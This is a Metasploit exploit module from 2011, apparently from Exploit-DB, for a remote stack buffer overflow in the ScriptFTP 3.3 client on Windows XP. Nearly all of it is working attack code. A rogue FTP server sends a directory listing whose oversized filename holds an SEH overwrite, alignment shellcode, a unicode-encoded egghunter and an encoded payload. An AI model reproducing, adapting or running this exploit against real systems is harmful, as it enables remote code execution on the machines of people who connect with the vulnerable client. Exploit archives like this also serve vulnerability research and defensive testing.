#Exploit Title: ScriptFTP 3.3 Remote Buffer Overflow (MSF)
#Date: Sept 20 2011
#Author: otoy
#Version: 3.3
#Tested on: Windows XP SP3
#CVE : -
#EDB-ID: 17876
#Thanks: cyb3r.anbu, spentera-team, dE-team, offsec, exploit-db, corelanc0d3r


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ScriptFTP 3.3 Remote Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in ScriptFTP 3.3 ftp client. The overflow is
				triggered when the client connects to a FTP server which sends an overly long directory
				and filename in response to a GETLIST command.

				This will cause an access violation, and will eventually overwrite the saved extended
				instruction pointer.  
			},
			'Author' 	 =>
				[
					'modpr0be', 	# Original bug
					'Cyberheb',	# porting from poc to msf
					'Otoy', 	# final msf module
				],
			'License'        => MSF_LICENSE,
			'Version'        => "0",
			'References'     =>
				[
					[ 'OSVDB', '75633'],
					[ 'URL', 'http://www.digital-echidna.org/2011/09/scriptftp-3-3-remote-buffer-overflow-exploit-0day/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
                                        'Space'    => 1000,
                                        'DisableNops' => true,
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'BadChars'  =>  "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0d\x2F\x5c\x3c\x3e\x5e\x7e",
                    			'EncoderOptions' =>
                        			{
                            				'BufferRegister' => 'EDX',
                        			}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Universal', { 'Ret' => "\x45\x5B", 'Offset' => 1746 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sept 20 2011',
			'DefaultTarget'  => 0))

	end

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end


	#Unicode Encoder
    	def get_unicode_payload(p)
        	encoder = framework.encoders.create("x86/unicode_upper")
        	encoder.datastore.import_options_from_hash( {'BufferRegister'=>'EAX'} )
        	unicode_payload = encoder.encode(p, nil, nil, platform)
        	return unicode_payload
    	end


	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")


		sampahawal = "A" * 1746
		nseh = "\x61\x62"
		seh = target['Ret']
		sampahbawah = 1250

                #prepare for align
            	align = "\x60"                      #pushad
            	align << "\x73"                     #nop/align
            	align << "\x53"                     #push ebx
            	align << "\x73"                     #nop/align
            	align << "\x58"                     #pop eax
            	align << "\x73"                     #nop/align
            	align << "\x05\x02\x11"             #add eax,0x11000200
            	align << "\x73"                     #nop/align
            	align << "\x2d\x01\x11"             #sub eax,0x11000120
            	align << "\x73"                     #nop/align

		#align after egg
            	align2 = "\x73\x57\x73\x58\x73"             #nop/push edi/nop/pop eax/nop
            	align2 << "\xb9\x1b\xaa"                    #mov ecx,0xaa001b00
            	align2 << "\xe8\x73"                        #add al,ch + nop
            	align2 << "\x50\x73\xc3"                    #push eax,nop,ret

            	#walking
            	walk = "\x50"                               #push eax
            	walk << "\x73"                              #nop/align
 	        walk << "\xc3"                              #ret

		#egghunter
            	egghunter = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYA"
                egghunter << "IAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA5"
                egghunter << "8AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZB"
                egghunter << "ABABABAB30APB944JBQVCQGZKOLO12PRQZKR1"
                egghunter << "HXMNNOLKUQJRTJO6XKPNPKP44TKJZ6O3EJJ6O"
                egghunter << "SEYWKOYWA"

		#junk
		sampah1 = "\x44" * 106 + "\x73"
		sampah2 = "\x42" * 544

		#egg
		telur = "0t0t"
		
		#payload
		stubget = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
		palpha = stubget + payload.encoded
		puni = get_unicode_payload(palpha)
		
		#filename
		filename = sampahawal
		filename << nseh
		filename << seh
		filename << align
		filename << walk
		filename << sampah1
		filename << egghunter
		filename << sampah2
		filename << telur
		filename << align2
		filename << puni
		filename << sampah1

		print_status(" - Sending directory list via data connection")
                dirlist = "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
                dirlist << "drwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}\r\n"
                dirlist << "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
		conn.put(dirlist)
		conn.close
		return
	end

end
